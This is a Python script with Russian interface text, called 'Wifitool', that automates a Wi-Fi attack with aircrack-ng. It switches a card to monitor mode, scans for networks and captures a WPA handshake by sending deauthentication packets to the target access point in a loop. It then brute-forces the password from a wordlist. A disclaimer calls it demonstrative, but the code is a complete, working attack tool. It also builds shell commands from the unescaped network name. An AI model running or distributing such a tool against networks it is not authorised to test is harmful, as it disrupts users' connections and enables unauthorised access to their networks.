
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import signal
import threading
import shutil
from pathlib import Path

# Глобальные переменные
current_progress = 0
ctrlc_pressed = False
wireless_card = ""
wireless_card_monitormode = ""
target_name = ""
target_bssid = ""
target_channel_number = ""

# Обработка Ctrl+C
def signal_handler(sig, frame):
    global ctrlc_pressed
    ctrlc_pressed = True
    print("\n[!] Получен сигнал Ctrl+C")

# Функция выполнения системных команд
def run_command(cmd, silent=False, title=""):
    try:
        if title and not silent:
            print(f"\n[{title}]")
        
        if silent:
            result = subprocess.run(cmd, shell=True, 
                                   stdout=subprocess.DEVNULL, 
                                   stderr=subprocess.DEVNULL)
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout.strip()
        return ""
    except Exception as e:
        print(f"[-] Ошибка выполнения команды: {e}")
        return ""

# Функция очистки и восстановления
def first_run_fix():
    print("[*] Восстановление после предыдущего запуска...")
    
    # Определяем монитор интерфейс
    cmd = "iw dev | grep 'Interface' | grep 'mon' | awk '{print $2}'"
    mon_interface = run_command(cmd)
    
    if mon_interface:
        run_command(f"sudo airmon-ng stop {mon_interface}", silent=True)
        run_command(f"sudo ifconfig {mon_interface} up", silent=True)
    
    # Удаляем временные файлы
    if os.path.exists("tmp"):
        shutil.rmtree("tmp")
    
    csv_files = [f for f in os.listdir(".") if f.endswith(".csv")]
    for file in csv_files:
        try:
            os.remove(file)
        except:
            pass
    
    # Определяем беспроводной интерфейс
    cmd = "iw dev | grep 'Interface' | head -n 1 | awk '{print $2}'"
    global wireless_card, wireless_card_monitormode
    wireless_card = run_command(cmd)
    wireless_card_monitormode = f"{wireless_card}mon"
    
    print(f"[+] Используемый интерфейс: {wireless_card}")

# Функция прогресса
def progress(percent):
    global current_progress
    current_progress = percent
    os.system("clear")
    
    bar_length = 50
    filled_length = int(bar_length * percent / 100)
    
    bar = "[" + "=" * filled_length + ">" + " " * (bar_length - filled_length) + "]"
    print(f"\n{bar} {percent}%\n")

# Функция справки
def help_func():
    global current_progress
    progress(current_progress)
    
    print("\n[1] Для проверки и установки необходимых компонентов.")
    print("[2] Для перевода сетевой карты в режим монитора.")
    print("[3] Для прослушки сетей.")
    print("[4] Для перехвата хендшейка.")
    print("[5] Для перебора пароля\n")
    return 0

# Проверка необходимых компонентов
def check_func():
    progress(5)
    print("\nПроверка необходимых компонентов...")
    
    required_tools = ["aircrack-ng", "xterm", "iw"]
    
    for tool in required_tools:
        if run_command(f"which {tool}", silent=True):
            print(f"[+] {tool} - установлен")
        else:
            print(f"[-] {tool} - отсутствует")
            print(f"[*] Установка {tool}...")
            
            if tool == "aircrack-ng":
                run_command("sudo apt-get update && sudo apt-get install -y aircrack-ng", silent=True)
            elif tool == "xterm":
                run_command("sudo apt-get update && sudo apt-get install -y xterm", silent=True)
    
    progress(10)
    print("\n[!] Все компоненты проверены! Можете продолжать работу.\n")

# Перевод в режим монитора
def monitor_func():
    progress(15)
    print("\n[*] Перевод карты в режим монитора...")
    
    run_command("sudo airmon-ng check kill", silent=True, title="Остановка мешающих процессов")
    progress(20)
    
    run_command(f"sudo airmon-ng start {wireless_card}", silent=True, title="Включение режима монитора")
    progress(25)
    
    print("\n[+] Готово! Используйте [3] чтобы прослушать WiFi.\n")

# Сканирование сетей
def sniff_func():
    global target_name, target_bssid, target_channel_number
    
    # Запуск сканирования в отдельном потоке
    def sniff_thread():
        cmd = f"timeout 9 sudo airodump-ng {wireless_card_monitormode} --output-format=csv -w nets.csv --write-interval 3"
        run_command(cmd, silent=True, title="Поиск WiFi сетей")
    
    thread = threading.Thread(target=sniff_thread)
    thread.start()
    
    # Анимация прогресса
    for i in range(33):
        progress(3 * i)
        time.sleep(0.26)
    
    thread.join()
    progress(60)
    
    # Парсинг результатов
    if not os.path.exists("nets.csv-01.csv"):
        print("[-] Не удалось найти результаты сканирования")
        return False
    
    print("\n[+] Найденные сети:\n")
    
    # Простой вывод сетей
    cmd = "cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | awk -F',' '{print $14}' | awk '{$1=$1};1' | sed -r '/^\\s*$/d'"
    networks = run_command(cmd)
    
    if networks:
        print(networks)
    else:
        print("[-] Не удалось получить список сетей")
        return False
    
    # Выбор сети
    target_name = input("\n[?] Введите название вашей сети (регистр учитывается): ").strip()
    
    if not target_name:
        print("[-] Не указано название сети")
        return False
    
    progress(70)
    
    # Создаем временную папку
    os.makedirs("tmp", exist_ok=True)
    
    # Извлекаем информацию о сети
    cmd = f"cat nets.csv-01.csv | sed -n '/Station/q;p' | sed '/Last time seen/d' | grep '{target_name}'"
    
    # Имя сети
    netname_cmd = cmd + " | awk -F',' '{print $14}' > tmp/netname.txt"
    run_command(netname_cmd, silent=True)
    
    # BSSID
    netbssid_cmd = cmd + " | awk -F',' '{print $1}' > tmp/netbssid.txt"
    run_command(netbssid_cmd, silent=True)
    
    # Канал
    channel_cmd = cmd + " | awk -F',' '{print $4}' > tmp/channel.txt"
    run_command(channel_cmd, silent=True)
    
    # Чтение данных из файлов
    try:
        with open("tmp/netname.txt", "r") as f:
            target_name = f.read().strip()
        
        with open("tmp/netbssid.txt", "r") as f:
            target_bssid = f.read().strip()
        
        with open("tmp/channel.txt", "r") as f:
            target_channel_number = f.read().strip()
    except:
        print("[-] Ошибка чтения данных о сети")
        return False
    
    print(f"\n[+] Выбранная сеть: {target_name}")
    print(f"[+] MAC-адрес сети: {target_bssid}")
    print(f"[+] Канал сети: {target_channel_number}")
    print("\n[+] Данные сохранены! Можно приступить к перехвату хендшейка [4].\n")
    
    return True

# Прослушивание выбранной сети
def deauth_func():
    global ctrlc_pressed
    
    if not all([target_bssid, target_channel_number, target_name]):
        print("[-] Сначала выполните сканирование сетей [3]")
        return False
    
    print("\n[*] Запуск прослушивания выбранной сети...")
    
    # Запуск airodump-ng в отдельном потоке
    def airodump_thread():
        cap_file = f"tmp/{target_name}.cap"
        cmd = f"sudo airodump-ng {wireless_card_monitormode} --bssid={target_bssid} -c {target_channel_number} -w {cap_file}"
        run_command(cmd, silent=True, title="Прослушивание сети")
    
    thread = threading.Thread(target=airodump_thread)
    thread.daemon = True
    thread.start()
    
    # Анимация настройки канала
    print("\n[*] Настройка сетевого канала...")
    for _ in range(15):
        for anim in ["[)].", "[|]..", "[(]...", "[|].."]:
            print(f"\r{anim}", end="", flush=True)
            time.sleep(0.1)
    
    progress(80)
    print("\n[!] Как только получите хендшейк, нажмите Ctrl+C\n")
    
    # Цикл деаутентификации
    signal.signal(signal.SIGINT, signal_handler)
    
    try:
        while not ctrlc_pressed:
            print("[*] Отправка пакетов деаутентификации...")
            
            deauth_cmd = f"sudo aireplay-ng --deauth 7 -a {target_bssid} {wireless_card_monitormode}"
            run_command(deauth_cmd, silent=True, title="Деаутентификация")
            
            time.sleep(6)
    except KeyboardInterrupt:
        ctrlc_pressed = True
    
    progress(90)
    print("\n[+] Хендшейк пойман (предположительно). Для брутфорса запустите [5].\n")
    return True

# Подбор пароля
def crack_func():
    if not os.path.exists("list.txt"):
        print("[-] Файл list.txt не найден")
        print("[*] Создайте файл list.txt со списком паролей")
        return False
    
    cap_files = list(Path("tmp").glob("*.cap"))
    if not cap_files:
        print("[-] Не найдены .cap файлы с хендшейком")
        print("[*] Сначала выполните перехват хендшейка [4]")
        return False
    
    cap_file = cap_files[0]
    print(f"\n[*] Найден файл хендшейка: {cap_file}")
    
    print("\n[*] Запуск подбора пароля...")
    cmd = f"sudo aircrack-ng -w list.txt {cap_file}"
    run_command(cmd, title="Подбор пароля")
    
    # Копируем файл хендшейка
    try:
        shutil.copy(cap_file, ".")
        print(f"\n[+] Файл хендшейка скопирован в текущую директорию: {cap_file.name}")
    except:
        print("[-] Не удалось скопировать файл хендшейка")
    
    progress(100)
    print("\n[+] Программа завершена!")
    
    # Очистка
    first_run_fix()
    return True

# Главное меню
def main():
    os.system("clear")
    signal.signal(signal.SIGINT, signal_handler)
    
    # Инициализация
    first_run_fix()
    progress(0)
    
    print("\n                   Wifitool v0.1 (Python версия)")
    print("\n\n[!] Внимание!")
    print("Данная программа носит демонстративный характер.")
    print("Мы не несем ответственности за ваши действия.")
    print("\n[?] Введите '0' или '?' для справки.\n")
    
    while True:
        try:
            user_input = input("WiFi Tool: ").strip()
            
            if user_input in ["0", "?"]:
                help_func()
            elif user_input == "1":
                check_func()
            elif user_input == "2":
                monitor_func()
            elif user_input == "3":
                sniff_func()
            elif user_input == "4":
                deauth_func()
            elif user_input == "5":
                crack_func()
            else:
                print("[-] Команда не распознана. Введите [0] или [?] для справки.\n")
        except KeyboardInterrupt:
            print("\n\n[!] Выход из программы...")
            first_run_fix()
            sys.exit(0)
        except Exception as e:
            print(f"[-] Ошибка: {e}")

if __name__ == "__main__":
    # Проверка прав администратора
    if os.geteuid() != 0:
        print("[!] Программа требует прав администратора (sudo)")
        print("[*] Запустите: sudo python3 wifitool.py")
        sys.exit(1)
    
    main()
